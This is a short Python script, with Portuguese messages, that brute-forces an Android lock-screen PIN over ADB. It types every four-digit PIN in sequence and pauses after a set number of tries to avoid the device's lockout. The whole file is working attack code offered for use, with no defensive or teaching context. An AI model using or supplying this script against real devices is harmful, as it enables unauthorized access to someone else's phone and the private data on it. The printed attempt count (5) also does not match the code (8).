import time
import os

def adb_shell(command):
    os.system(f"adb shell {command}")


def enter_pin(pin):
    for digit in pin:
        adb_shell(f"input text {digit}")
    adb_shell(f"input keyevent 66")

with open("wordlis4.txt", "w") as file:
    for i in range(1000, 10001):
        file.write(f"{i}\n")

with open("wordlis4.txt", "r") as file:
    pins = file.readlines()

pins = [pin.strip() for pin in pins]

tentativas = 0

for pin in pins:
    print("tentando pin {}".format(pin))
    enter_pin(pin)
    tentativas += 1

    if tentativas == 8:
        print("5 tentativas atigindas, aguarde 35 segundos para evitar block...")
        time.sleep(35)
        tentativas = 0